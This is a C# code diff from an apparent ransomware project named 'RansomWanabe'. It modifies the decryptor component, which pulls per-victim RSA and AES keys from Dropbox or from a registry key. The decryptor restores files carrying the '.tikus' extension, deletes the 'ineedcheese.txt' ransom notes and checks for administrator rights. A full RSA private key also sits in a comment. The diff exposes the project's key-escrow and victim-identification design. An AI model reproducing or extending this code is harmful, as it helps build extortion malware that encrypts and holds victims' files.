@@ -4,9 +4,11 @@ using System.IO;
 using System.IO.Compression;
 using System.Linq;
 using System.Security.Cryptography;
+using System.Security.Principal;
 using System.Text;
 using System.Threading.Tasks;
 using Dropbox.Api;
+using Microsoft.Win32;
 
 namespace RansomWanabe
 {
@@ -156,33 +158,44 @@ namespace RansomWanabe
 
     public class GetKey
     {
+        public static RegistryKey LocalReg = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\FreePalestine");
+
         public static string GetPublicKey()
         {
             var publicKey = File.ReadAllText(Path.Combine(@"C:\Users\ch4rm\Desktop\encme", "public.key"));
             return publicKey;
         }
 
-        public static string GetPrivateKey()
+        public static string GetPrivateKey(string uid)
         {
             //get key online
-
-            Task<byte[]> task = Task.Run(() => Dropbox.DownloadFile(Environment.MachineName, "private.key"));
+            Task<byte[]> task = Task.Run(() => Dropbox.DownloadFile(uid, "private.key"));
             task.Wait();
 
             var privateKey = Encoding.UTF8.GetString(task.Result);
 
+            //var SPrivKey = @"<RSAKeyValue><Modulus>vHOJKxH574XOQ2hD3szun+rGaAfJXKRgYcPT9+dopFNQrrXlSuPDxxlaQUj/KZAOzg0tcjZK9Up8VIZo2t6nLtOAtBhm/52BO0KmTIFuqjehX6X2F0qB9HnxhZea1tuF1vb1lj9UZ6zMMCotnIuCC8gfftCwglsosFex1gOM58I8NQvYgOleDt2WzpIUp/ZIIxZpNjVHYrbDLRbgB5TPNzj3mwVMAz2hqROEG0MCNS+/qwPNCccsO7CkdkX89tKXZVN2iuCdbSZ6Z0MflVbC4TGiFbjY51JNJoiGfaUO3nn1wH1kduhUB1bDkNTEL7TcDLR9lizKw6idxb31gCciazQ6mDgYOFF0WRtkQ7pi4MJGiFkrhxMPXNfz8iJlDaJxH32SggdEBzze4TKNK4yjuazE4UqEQPmwgAnA7uHKSBJq9kQMyJKpWfSucyQssjio5f3M50O8VMm48pQCb8PWLSZe1cPAocP7HujZLEOdkRlCkuiXY+uZ+HLB+XGk/25vOJPvGSVYDC/jHDyADD2D1YgD6hlCqeeVlYSP0iJrtP9gP1GSYSBccF1v1nxr5EWrSMfH2Rdv91Bq1EaT0whXQTvgHnbvckwGXDWAIG9SPkpR4BCapZ7cPC3kfqFuky1NFLWrH+lUNyypin5tM6o+74I1uU26jXihEYyaKz6Rzp0=</Modulus><Exponent>AQAB</Exponent><P>2n6aj5djXViU1sJkrZxJbYJKCXCvv2a5pt0iXgdlvhyrrJaL7YIH9Gkxw40W07l7TGNe8Vr2UX+yYWggymMqcQEnv7nkiftI2cCU00u+Nvi5dw2uxAvwT/qF+vcDYNl357K3MnHl0TUEsuVZym3AxMOs4mhdtEx/FAuhw9SQOTig8IgIo/XMcvJw6mU/hBsKdGVc3cWjxErlPNsFzrmK4axqdNXhae3SZQ6wiQzPqBW0jX1FJf4X4Iw5AqnUZUl+hlAxZnwpE7NTntMr1BXwWO5RHftb4SnBVcQ0EpTHSXb86ZNeYfiqc3dK/Mx1NTi6zDle/TcFB/LxHWHcFztEOw==</P><Q>3My604HTWtsta/Sv/NoUcL78nAq2xBAy69adJ/9eKdHzBRI7bZYBD2VuqrIUapM4JQxJAobNXYBdBzFYPgCk4POdt54IMXWVRO7sV9RpWGBProu17l1fnEJm80hP8n9QXCWujStLnlYr4MEJuvGsSpfV9xmoUEB3LKWhPon6K2ywYWxYXXGtrIh2G6lPxjqp1puUJ4AS3IcK8YyFMDoUs+dU8B0mNyw9aA3nSIYEwlACrboolTXZCsAeRIGPsh8y6bGSpQ2R/qvVYXD0PjUI31iyEdpwtzFUyGccLv3p77xgMiiHJhP1nK8v4t7f+RFOWNlzoA6egopB0MxnN07DBw==</Q><DP>LprQpw44kKGjZcejJ/DtLKGc3zSdGCt2MCR8/yd+yTVeXPrjr+6LedOyXK7Mjq7CoQGVL9AiODIPv30xeVn7pI0FiHzDRbdGy8OrOwKt+RXGoaFWhNSzFqwuReDIZLEeRVq2ftkSlzRC41HOfEI62v2N8+ElE585f/IXOCkv9jShB41MooR8boxOD4E3Mht+eGNikp9klisPiJKDQ5wKBqb7Mh6o7SpgNVQTzbfg106B66grxrXTK/9c7beB6XTquwWB9AVJ0bzvejI66Ash8CYtQULrTzTT21J1dP0tIPtzaPMZL7aVzPlGEnQeEBMgrQ0TuNkyhoaIbacBBieLHw==</DP><DQ>d017yRrF67qv0TwV90aSctUPQvUbCddC3GFK6zi1VV1mtR/D0pORoRMKd9re4zMGzCXWMTJLNrFMEr3b0yyf6hhX6MXP4YGKFQQP2ekgvqrTgxlkRRZYueK7I8q3v+yArDmEFi0Fn9kpvjgvnL5GfMuLxgcsBai/e/VGqbb94IbKyuky2dK5p5bYUlvqic5axGWt6KXwCw5AoIFv2b4YP5jIMTFe28Lgrx+MD4iye5elyt7iXLUKwB9Me3GSBgmLhe/3r40kjHmmQw84OYCIeb3AAZuI+cMC74GfHdj+lRWw2IlDdRSlynJyKmCInlh2f9WG/z3G8fvoUfyP7Ld28w==</DQ><InverseQ>moicL0IqF/Z22ZMvk2Oorn5c/XFDhVm61B5zRg7uBQnBWyAa/JVZ32a9tOq+0vOLpWRsaoACRpuBr8ymQnxU8Ml4rQDJl4g2nC5AoeHqNX8tMZGJ6egCosY3t9oExn21cpGDORkzIcIoo9XQrDwmM+II9cFXrJKVEzyn7DJzY9RQ2kH+mBNc9rrhPWPuKqt3zGmY5j5i4NP/4JCVnkrMJj18C9oiNcPVrEsR2QtsuXJwvv+Zwhs7v+QqAXkzk5qu65iGp8aEpi23OMJmMeoHg6UKfyEY0jL8Qd/AuDyscXsjJi6C9MHSEdK5TmizmpUY+1Sucwx+OZjxc4fJIO4kow==</InverseQ><D>oWYOR54IwlSGGIM3BZ3cjYfkz3pDwh1iErlGVJ6Tp5FXm5pbu+0gYufavelH6A/iLiVpE9VeE4DsxPOs4C8rXlZ0d0ojBK+f2+I0TXfZEN2+Tw3zm3ULohfCe9khGv0+PqKaKUkp//Ull+a308hD49VM7C7NzYdHbOhefd3ikyduqzvu/FFiZjbwDxFbsZKjq7FpAK1W6zt+I6Lg0n1nj3Mx1UoPFQN27jixvyt/u4+eh1glBkfYIXMjF8zPX5Fzaqu17jF7gt0enkwFw8Bf/cClghcjZdK+Es+A6CEyf+ZSTL7YCWLnfLWZnvQq5nTutc7rdG/+ZN6H6bDMjyp1NYVz4XhMwtC/WbJPeOwZcuzZd7DumqSBOT6GQhJcSqb7WFXMYz1MHFpBCkdWSrrNm5+7WPVTCx2pyXysMCm2spqbXyYji9ljHeRkilbzn9psdMeSLjRKtvL+YlParAPH0VyVKWDR/UXD64p6iSUuUW1NwRo6AYd+Q7AfUjAxVtHAY1jF42mcg2yb418yiYI4suzvG+Y7kRu9OmB09KBzG1vWcoV04JC2h790HEr0xrjUd1i848ZF/nAiUYnppoKgvvUrBaPPpMIy6g+gyOrj7AsM1KmIzhrdB30V65rb1kRatj2XfxeL2ebodLtSbTsavyVrW8orB6MWg3aJEkcoUl0=</D></RSAKeyValue>";
+            //var privateKey = Asymmetric.RSA.Decrypt(encprivateKey, SPrivKey);
+
             //var privateKey = File.ReadAllText(Path.Combine(@"C:\Users\ch4rm\Desktop\encme", "private.key"));
             //var privateKey = Encoding.UTF8.GetString(privKey);
-            
+
             return privateKey;
         }
 
-        public static byte[] GetAESKey()
+        public static byte[] GetAESKey(string uid)
         {
-            Task<byte[]> task = Task.Run(() => Dropbox.DownloadFile(Environment.MachineName, "aes.key"));
-            task.Wait();
-
-            var aeskey = task.Result;
+            byte[] aeskey = { };
+            if(LocalReg != null)
+            {
+                aeskey = (byte[])LocalReg.GetValue("aesKey");
+            }
+            else
+            {
+                Task<byte[]> task = Task.Run(() => Dropbox.DownloadFile(uid, "aes.key"));
+                task.Wait();
+                aeskey = task.Result;
+            }
 
             //var aeskey = File.ReadAllBytes(Path.Combine(@"C:\Users\ch4rm\Desktop\encme", "aes.key"));
             //var aeskey = Encoding.UTF8.GetString(privKey);
@@ -190,13 +203,20 @@ namespace RansomWanabe
             return aeskey;
         }
 
-        public static byte[] GetAESIV()
+        public static byte[] GetAESIV(string uid)
         {
-            Task<byte[]> task = Task.Run(() => Dropbox.DownloadFile(Environment.MachineName, "aes.iv"));
-            task.Wait();
+            byte[] aesiv = { };
+            if (LocalReg != null)
+            {
+                aesiv = (byte[])LocalReg.GetValue("aesIV");
+            }
+            else
+            {
+                Task<byte[]> task = Task.Run(() => Dropbox.DownloadFile(uid, "aes.iv"));
+                task.Wait();
 
-            var aesiv = task.Result;
-
+                aesiv = task.Result;
+            }
             //var aesiv = File.ReadAllBytes(Path.Combine(@"C:\Users\ch4rm\Desktop\encme", "aes.iv"));
             return aesiv;
         }
@@ -229,6 +249,9 @@ namespace RansomWanabe
 
     class Program
     {
+        public static readonly string userName = Environment.UserName;
+        public static readonly string uid = $"{Environment.MachineName}-{userName}";
+
         public static byte[] Decompress(byte[] data)
         {
             MemoryStream input = new MemoryStream(data);
@@ -240,11 +263,21 @@ namespace RansomWanabe
             return output.ToArray();
         }
 
+        public static bool IsElevated
+        {
+            get
+            {
+                return WindowsIdentity.GetCurrent().Owner
+                  .IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid);
+            }
+        }
+
+
         static void Main(string[] args)
         {
-            //var publicKey = GetKey.GetPublicKey();
 
-            var baseDir = @"C:\Users\ch4rm\Desktop\encme";
+            //var publicKey = GetKey.GetPublicKey();
+            var baseDir = $@"C:\Users\{userName}\Desktop";
 
             string ransomFormat = ".tikus";
 
@@ -252,43 +285,60 @@ namespace RansomWanabe
 
             var userDesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
 
-            var computerName = Environment.MachineName;
-
-
-            if (Directory.Exists(baseDir))
+            if(!IsElevated)
             {
-                var targetDirs = Directory.EnumerateFiles(baseDir, "*.*", SearchOption.AllDirectories);
+                Console.WriteLine("Make sure to run this as administrator");
+            }
+            else
+            {
 
-                var privateKey = GetKey.GetPrivateKey();
-
-                byte[] aes_key = Asymmetric.RSA.Decrypt(GetKey.GetAESKey(), privateKey);
-
-                byte[] aes_iv = Asymmetric.RSA.Decrypt(GetKey.GetAESIV(), privateKey);
-
-                //decrypt with this
-                foreach (var file in targetDirs.Where(x => x.EndsWith(ransomFormat)))
+                if (Directory.Exists(baseDir))
                 {
-                    var decryptedFile = Path.Combine(baseDir, $"{Path.GetFileNameWithoutExtension(file)}");
-                    var outputFile = Path.Combine(Path.GetDirectoryName(file), Path.GetFileNameWithoutExtension(file));
-                    var ransomNotePath = $"{Path.GetDirectoryName(file)}\\ineedcheese.txt";
-
-                    if (!File.Exists(decryptedFile))
+                    try
                     {
-                        var fileContent = File.ReadAllBytes(file);
+                        var targetDirs = Directory.EnumerateFiles(baseDir, "*.*", SearchOption.AllDirectories);
 
-                        File.Delete(file);
+                        var privateKey = GetKey.GetPrivateKey(uid);
 
-                        //var decrypted = Decompress(Asymmetric.RSA.Decrypt(fileContent, privateKey));
-                        var decrypted = AES.AESDecrypt(fileContent, aes_key, aes_iv);
+                        byte[] aes_key = Asymmetric.RSA.Decrypt(GetKey.GetAESKey(uid), privateKey);
 
-                        File.WriteAllBytes(outputFile, decrypted);
+                        //Console.WriteLine("yang aku dapat: " +Encoding.UTF8.GetString((byte[])GetKey.LocalReg.GetValue("aesKey")));
+                        //Console.WriteLine("sepatutnya: " + Encoding.UTF8.GetString(GetKey.GetAESKey(uid)));
 
-                        if (File.Exists(ransomNotePath))
-                            File.Delete(ransomNotePath);
+                        byte[] aes_iv = Asymmetric.RSA.Decrypt(GetKey.GetAESIV(uid), privateKey);
+
+                        //decrypt with this
+                        foreach (var file in targetDirs.Where(x => x.EndsWith(ransomFormat)))
+                        {
+                            var decryptedFile = Path.GetFileNameWithoutExtension(file);
+                            var outputFile = Path.Combine(Path.GetDirectoryName(file), Path.GetFileNameWithoutExtension(file));
+                            var ransomNotePath = $"{Path.GetDirectoryName(file)}\\ineedcheese.txt";
+
+                            if (!File.Exists(decryptedFile))
+                            {
+                                var fileContent = File.ReadAllBytes(file);
+
+                                File.Delete(file);
+
+                                //var decrypted = Decompress(Asymmetric.RSA.Decrypt(fileContent, privateKey));
+                                var decrypted = AES.AESDecrypt(fileContent, aes_key, aes_iv);
+
+                                File.WriteAllBytes(outputFile, decrypted);
+
+                                if (File.Exists(ransomNotePath))
+                                    File.Delete(ransomNotePath);
+
+                            }
+
+                        }
+                    }
+                    catch
+                    {
 
                     }
-
+            
                 }
+            
             }
 
         }
